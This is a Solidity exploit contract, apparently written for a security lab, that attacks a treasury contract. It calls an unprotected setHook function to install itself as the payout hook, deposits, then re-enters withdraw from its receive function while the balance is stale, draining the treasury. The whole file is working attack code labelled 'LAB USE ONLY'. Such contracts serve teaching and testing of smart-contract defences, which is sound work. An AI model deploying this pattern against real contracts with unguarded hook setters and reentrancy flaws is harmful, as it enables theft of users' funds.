// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IAdvancedTreasury {
    function deposit() external payable;
    function withdraw() external;
    function setHook(address newHook) external;
}

/// @title AdvancedTreasuryAttacker
/// @notice Combined access-control and reentrancy attacker.
/// @dev LAB USE ONLY. The contract installs itself as the payout hook and then
///      re-enters `withdraw` to drain the treasury.
contract AdvancedTreasuryAttacker {
    IAdvancedTreasury public immutable treasury;
    uint256 public depositAmount;

    constructor(address treasuryAddress) {
        require(treasuryAddress != address(0), "AdvancedTreasuryAttacker: zero treasury");
        treasury = IAdvancedTreasury(treasuryAddress);
    }

    /// @notice Install the hook, deposit and start the reentrant withdrawal.
    function attack() external payable {
        require(msg.value > 0, "AdvancedTreasuryAttacker: zero deposit");
        depositAmount = msg.value;
        treasury.setHook(address(this));
        treasury.deposit{ value: msg.value }();
        treasury.withdraw();
    }

    /// @notice Re-enter the treasury while its balance is stale.
    receive() external payable {
        if (address(treasury).balance >= depositAmount) {
            treasury.withdraw();
        }
    }
}
